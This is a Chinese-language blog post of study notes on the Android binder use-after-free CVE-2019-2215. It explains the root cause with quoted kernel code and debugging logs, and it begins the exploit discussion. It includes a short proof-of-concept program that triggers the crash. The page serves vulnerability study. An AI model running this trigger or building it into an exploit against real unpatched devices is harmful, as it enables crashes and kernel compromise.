<!doctype html>
<html lang="en-us">

<head>
  <title>CVE-2019-2215 Study Notes // ExiaHan&#39;s Blog</title>
  <meta charset="utf-8" />
  <meta name="generator" content="Hugo 0.72.0" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta name="author" content="ExiaHan" />
  <meta name="description"
    content="" />
  <link rel="stylesheet" href="https://blog.exiahan.com/css/main.min.61bb32028587f24ca28522d8d197970c7ef33284e5fffb45a75fcbbb2dbc4dcb.css" />
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-99031617-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag() { dataLayer.push(arguments); }
    gtag('js', new Date());

    gtag('config', 'UA-99031617-1');
  </script>
  
  <script data-ad-client="ca-pub-2799549609730639" async
    src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>


  
  <meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="CVE-2019-2215 Study Notes"/>
<meta name="twitter:description" content="最近有了点时间，好好看了下CVE-2019-2215的漏洞利用细节，这里记录下来，一方面留着以后再看方便，一方面把自己的理解写出来也是学习的一种方式。
这里问我写的内容可以看成是对Google Project Zero的文章的翻译加上一些个人想法，不过还是推荐看看原文，链接在这里, 因为看的其他的多多少少都有点模糊的地方,没有P0的文章说的详细，这也是我想自己写一个分析的原因。
1. Root Cause 通过阅读对应的issue page和 根据对应的内核Patch(需要注意commit里的内容不太准确), 造成CVE-2019-2215的根本原因在于binder driver内部在收到BINDER_THREAD_EXIT的ioctl后，负责释放对应binder_thread的函数在free binder_thread前没有检查当前binder_thread 是否在epoll中存在引用，从而导致在epoll中存在引用的binder_thread在被释放后依然在epoll中存在一个悬挂指针。当后面epoll因为一些原因尝试删除该已经被释放的binder_thread内部指向的一个waitqueue时出现未定义行为，如Crash(当被free的binder_thread所在的内存已经被分配给其他对象复写破坏时)
利用下面的poc可以在开了KASAN的对应kernel上触发crash
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  #include &lt;fcntl.h&gt;#include &lt;sys/epoll.h&gt;#include &lt;sys/ioctl.h&gt;#include &lt;unistd.h&gt; #define BINDER_THREAD_EXIT 0x40046208ul  int main() { int fd, epfd; struct epoll_event event = { .events = EPOLLIN }; fd = open(&#34;/dev/binder0&#34;, O_RDONLY); epfd = epoll_create(1000); epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &amp;event); ioctl(fd, BINDER_THREAD_EXIT, NULL); }   整个触发时间过程如下图："/>

  <meta property="og:title" content="CVE-2019-2215 Study Notes" />
<meta property="og:description" content="最近有了点时间，好好看了下CVE-2019-2215的漏洞利用细节，这里记录下来，一方面留着以后再看方便，一方面把自己的理解写出来也是学习的一种方式。
这里问我写的内容可以看成是对Google Project Zero的文章的翻译加上一些个人想法，不过还是推荐看看原文，链接在这里, 因为看的其他的多多少少都有点模糊的地方,没有P0的文章说的详细，这也是我想自己写一个分析的原因。
1. Root Cause 通过阅读对应的issue page和 根据对应的内核Patch(需要注意commit里的内容不太准确), 造成CVE-2019-2215的根本原因在于binder driver内部在收到BINDER_THREAD_EXIT的ioctl后，负责释放对应binder_thread的函数在free binder_thread前没有检查当前binder_thread 是否在epoll中存在引用，从而导致在epoll中存在引用的binder_thread在被释放后依然在epoll中存在一个悬挂指针。当后面epoll因为一些原因尝试删除该已经被释放的binder_thread内部指向的一个waitqueue时出现未定义行为，如Crash(当被free的binder_thread所在的内存已经被分配给其他对象复写破坏时)
利用下面的poc可以在开了KASAN的对应kernel上触发crash
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  #include &lt;fcntl.h&gt;#include &lt;sys/epoll.h&gt;#include &lt;sys/ioctl.h&gt;#include &lt;unistd.h&gt; #define BINDER_THREAD_EXIT 0x40046208ul  int main() { int fd, epfd; struct epoll_event event = { .events = EPOLLIN }; fd = open(&#34;/dev/binder0&#34;, O_RDONLY); epfd = epoll_create(1000); epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &amp;event); ioctl(fd, BINDER_THREAD_EXIT, NULL); }   整个触发时间过程如下图：" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://blog.exiahan.com/cve-2019-2215_study_notes/" />
<meta property="article:published_time" content="2020-06-23T00:42:00+08:00" />
<meta property="article:modified_time" content="2020-06-23T00:42:00+08:00" />


</head>

<body>
  <header class="app-header">
    <a href="https://blog.exiahan.com/"><img class="app-header-avatar"
        src="/avatar.jpg"
        alt="ExiaHan" /></a>
    <h1>ExiaHan&#39;s Blog</h1>
    <p>
      Record everything, day by day.. 记录岁月，记录一切。
    </p>
    <div class="app-header-social">
      
      <a target="_blank" href="https://github.com/exiahan"
        rel="noreferrer noopener"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
  <title>github</title>
  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
</svg></a>
      
      <a target="_blank" href="https://twitter.com/exia_han"
        rel="noreferrer noopener"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-twitter">
  <title>twitter</title>
  <path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path>
</svg></a>
      
      <a target="_blank" href="https://www.linkedin.com/in/yang-han-4a3b79135/"
        rel="noreferrer noopener"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-linkedin">
  <title>linkedin</title>
  <path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle>
</svg></a>
      
      <a target="_blank" href="mailto:exiahan@exiahan.com"
        rel="noreferrer noopener"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-mail">
  <title>mail</title>
  <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline>
</svg></a>
      
    </div>
    <br>
    <p>Exchange Links:</p>
    <div class="app-header-exchange">
      
      <a target="_blank" href="https://blog.icehoney.me/" rel="noreferrer noopener">秋水姐姐</a><br>
      
      <a target="_blank" href="https://blog.brickgao.com/" rel="noreferrer noopener">高菊苣</a><br>
      
      <a target="_blank" href="https://farseerfc.me/" rel="noreferrer noopener">fc菊苣</a><br>
      
      <a target="_blank" href="https://felixc.at/" rel="noreferrer noopener">肥猫</a><br>
      
      <a target="_blank" href="https://blog.lilydjwg.me/" rel="noreferrer noopener">仙子</a><br>
      
      <a target="_blank" href="https://burningcodes.net/" rel="noreferrer noopener">光哥</a><br>
      
    </div>
  </header>
  <main class="app-container">
    
  <article class="post">
    <header class="post-header">
      <h1 class ="post-title">CVE-2019-2215 Study Notes</h1>
      <div class="post-meta">
        <div>
          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
  <title>calendar</title>
  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
</svg>
          Jun 23, 2020
        </div>
        <div>
          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
  <title>clock</title>
  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
</svg>
          14 min read
        </div><div>
          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tag">
  <title>tag</title>
  <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line>
</svg>
          <a class="tag" href="https://blog.exiahan.com/tags/android/">Android</a><a class="tag" href="https://blog.exiahan.com/tags/linux/">Linux</a><a class="tag" href="https://blog.exiahan.com/tags/cve/">CVE</a><a class="tag" href="https://blog.exiahan.com/tags/exploit/">Exploit</a></div></div>
    </header>
    <div class="post-content">
      <p>最近有了点时间，好好看了下CVE-2019-2215的漏洞利用细节，这里记录下来，一方面留着以后再看方便，一方面把自己的理解写出来也是学习的一种方式。</p>
<p>这里问我写的内容可以看成是对Google Project Zero的文章的翻译加上一些个人想法，不过还是推荐看看原文，链接在<a href="https://googleprojectzero.blogspot.com/2019/11/bad-binder-android-in-wild-exploit.html">这里</a>, 因为看的其他的多多少少都有点模糊的地方,没有P0的文章说的详细，这也是我想自己写一个分析的原因。</p>
<h2 id="1-root-cause">1. Root Cause</h2>
<p>通过阅读对应的<a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1942">issue page</a>和
根据对应的内核<a href="https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/commit/drivers/android/binder.c?h=linux-4.14.y&amp;id=7a3cee43e935b9d526ad07f20bf005ba7e74d05b">Patch</a>(需要注意commit里的内容不太准确),
造成CVE-2019-2215的根本原因在于binder driver内部在收到<code>BINDER_THREAD_EXIT</code>的ioctl后，负责释放对应binder_thread的函数在free binder_thread前没有检查当前binder_thread 是否在epoll中存在引用，从而导致在epoll中存在引用的binder_thread在被释放后依然在epoll中存在一个悬挂指针。当后面epoll因为一些原因尝试删除该已经被释放的binder_thread内部指向的一个waitqueue时出现未定义行为，如Crash(<em>当被free的binder_thread所在的内存已经被分配给其他对象复写破坏时</em>)</p>
<p>利用下面的poc可以在开了KASAN的对应kernel上触发crash</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;fcntl.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/epoll.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/ioctl.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e"></span>
<span style="color:#75715e">#define BINDER_THREAD_EXIT 0x40046208ul
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
{
        <span style="color:#66d9ef">int</span> fd, epfd;
        <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">epoll_event</span> event <span style="color:#f92672">=</span> { .events <span style="color:#f92672">=</span> EPOLLIN };

        fd <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;/dev/binder0&#34;</span>, O_RDONLY);
        epfd <span style="color:#f92672">=</span> epoll_create(<span style="color:#ae81ff">1000</span>);
        epoll_ctl(epfd, EPOLL_CTL_ADD, fd, <span style="color:#f92672">&amp;</span>event);
        ioctl(fd, BINDER_THREAD_EXIT, NULL);
}
</code></pre></td></tr></table>
</div>
</div><p>整个触发时间过程如下图：</p>
<p><img src="/images/cve20192215/crashTimeline.jpg" alt="binder poll crash"></p>
<p>可以看到首先通过<code>ioctl</code> 释放binder_thread, 然后程序退出，触发epoll的waitqueue删除操作，从而触发crash。在没打补丁且开了KASAN的对应虚拟机上尝试，可以得到如下的call stack。</p>
<p><img src="/images/cve20192215/kasan.jpg" alt="kasan"></p>
<p>从这里就能看到Crash是在remove_wait_queue里面被触发，因为
<a href="https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/tree/fs/eventpoll.c?h=linux-4.14.y&amp;id=7a3cee43e935b9d526ad07f20bf005ba7e74d05b"><code>ep_remove_wait_queue</code></a>调用了<a href="https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/tree/kernel/sched/wait.c?h=linux-4.14.y&amp;id=7a3cee43e935b9d526ad07f20bf005ba7e74d05b"><code>remove_wait_queue</code></a>， 而<code>remove_wait_queue</code>里面调用了<a href="https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/tree/include/linux/spinlock.h?h=linux-4.14.y&amp;id=7a3cee43e935b9d526ad07f20bf005ba7e74d05b"><code>spin_lock_irqsave</code></a></p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp"><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">ep_remove_wait_queue</span>(<span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">eppoll_entry</span> <span style="color:#f92672">*</span>pwq)
{
        wait_queue_head_t <span style="color:#f92672">*</span>whead;

        rcu_read_lock();
        <span style="color:#75715e">/*
</span><span style="color:#75715e">        * If it is cleared by POLLFREE, it should be rcu-safe.
</span><span style="color:#75715e">        * If we read NULL we need a barrier paired with
</span><span style="color:#75715e">        * smp_store_release() in ep_poll_callback(), otherwise
</span><span style="color:#75715e">        * we rely on whead-&gt;lock.
</span><span style="color:#75715e">        */</span>
        whead <span style="color:#f92672">=</span> smp_load_acquire(<span style="color:#f92672">&amp;</span>pwq<span style="color:#f92672">-&gt;</span>whead);
        <span style="color:#66d9ef">if</span> (whead)
                remove_wait_queue(whead, <span style="color:#f92672">&amp;</span>pwq<span style="color:#f92672">-&gt;</span>wait);
        rcu_read_unlock();
}

<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">remove_wait_queue</span>(<span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">wait_queue_head</span> <span style="color:#f92672">*</span>wq_head, <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">wait_queue_entry</span> <span style="color:#f92672">*</span>wq_entry)
{
        <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> flags;

        spin_lock_irqsave(<span style="color:#f92672">&amp;</span>wq_head<span style="color:#f92672">-&gt;</span>lock, flags);
        __remove_wait_queue(wq_head, wq_entry);
        spin_unlock_irqrestore(<span style="color:#f92672">&amp;</span>wq_head<span style="color:#f92672">-&gt;</span>lock, flags);
}
EXPORT_SYMBOL(remove_wait_queue);
</code></pre></td></tr></table>
</div>
</div><p><img src="/images/cve20192215/logWithPrintk.jpg" alt="log with printk"></p>
<p>通过分析crash时的log(这里我自己加了printk在binder_thread和ep_remove_wait_queue里面)，可以看到Crash时候的binder_thread object的地址是<code>0xffff888046070008</code>，同时在Crash之前的最后一个被释放的<code>eppoll_entry</code>的地址是<code>0xffff88803ab6e6a8</code>。 为了验证binder_thread object对应的fd被加到epoll中后两者的对应关系，我们使用kgdb调试一下kernel，这里具体怎么编译调试的kernel不具体展开，直接看调试打印的变量信息。</p>
<p><img src="/images/cve20192215/kgdbInfo.jpg" alt="kgdb info"></p>
<p>可以看到上面crash log里面<code>eppoll_entry.whead</code>刚好就是<code>binder_thread.wait</code>，所以现在可以确定这里<code>ep_remove_wait_queue</code>的<code>whead</code>变量，即<code>remove_wait_queue</code>的参数<code>wq_head</code>就是已经是被释放的binder_thread里的wait，所以当引用<code>wait-&gt;lock</code>时指向了一段已经被free的内存，从而在<code>spin_lock_irqsave</code>尝试去写<code>wait-&gt;lock</code>时触发KASAN报错。</p>
<p>如果深入检查<code>spin_lock_irqsave</code>，会发现最终调用了<a href="https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/tree/include/linux/spinlock_api_smp.h?h=linux-4.14.y&amp;id=7a3cee43e935b9d526ad07f20bf005ba7e74d05b"><code>_raw_spin_lock_irqsave</code></a>，其反汇编代码如下，可以看到其中做KASAN检查的地方。这里具体不再展开。</p>
<p><img src="/images/cve20192215/raw_spin_locl_irqsave_disassembly.jpg" alt="raw spin lock irqsave"></p>
<p>需要注意的是，如果<code>lock</code>本身不是0，那么在这里就会hang住，下面的<code>__remove_wait_queue</code>就无法执行，所以后面在做利用的时候需要做到能<strong>保持<code>binder_thread.wait.lock</code>的值为0.</strong></p>
<h2 id="2-exploit">2. Exploit</h2>
<p>前面在Root Cause里面已经分析过，之所以被KASAN检测到是因为binder_thread 已经被释放，所以wait指向的内存已经被打上KASAN的标记，但是如果KASAN没有开启，epoll的remove流程会继续走下去，最终走到<code>__list_del</code>。当然，P0的文章里也有提到，如果<code>CONFIG_DEBUG_LIST</code>开启的话，会走不同的代码块，并且有很多check，所以不会有exploit的机会存在，这里只讨论没有开启该flag的情况。</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp"><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">inline</span> <span style="color:#66d9ef">void</span>
<span style="color:#a6e22e">__remove_wait_queue</span>(<span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">wait_queue_head</span> <span style="color:#f92672">*</span>wq_head, <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">wait_queue_entry</span> <span style="color:#f92672">*</span>wq_entry)
{
        list_del(<span style="color:#f92672">&amp;</span>wq_entry<span style="color:#f92672">-&gt;</span>entry);
}


<span style="color:#75715e">#ifndef CONFIG_DEBUG_LIST
</span><span style="color:#75715e"></span>...
<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">inline</span> <span style="color:#66d9ef">void</span> list_del(<span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">list_head</span> <span style="color:#f92672">*</span>entry)
{
        __list_del(entry<span style="color:#f92672">-&gt;</span>prev, entry<span style="color:#f92672">-&gt;</span>next);
        entry<span style="color:#f92672">-&gt;</span>next <span style="color:#f92672">=</span> LIST_POISON1;
        entry<span style="color:#f92672">-&gt;</span>prev <span style="color:#f92672">=</span> LIST_POISON2;
}

<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">inline</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">__list_del</span>(<span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">list_head</span> <span style="color:#f92672">*</span> prev, <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">list_head</span> <span style="color:#f92672">*</span> next)
{
        next<span style="color:#f92672">-&gt;</span>prev <span style="color:#f92672">=</span> prev;
        WRITE_ONCE(prev<span style="color:#f92672">-&gt;</span>next, next);
}
</code></pre></td></tr></table>
</div>
</div><p>这里最开始的<code>old</code>就是<code>eppoll_entry.wait</code>，根据代码的解释，即为<code>binder_thread.wait</code>指向的链表上的一个<strong>item</strong>。</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp"><span style="color:#75715e">/* Wait structure used by the poll hooks */</span>
<span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">eppoll_entry</span> {
        <span style="color:#75715e">/* List header used to link this structure to the &#34;struct epitem&#34; */</span>
        <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">list_head</span> llink;

        <span style="color:#75715e">/* The &#34;base&#34; pointer is set to the container &#34;struct epitem&#34; */</span>
        <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">epitem</span> <span style="color:#f92672">*</span>base;

        <span style="color:#75715e">/*
</span><span style="color:#75715e">        * Wait queue item that will be linked to the target file wait
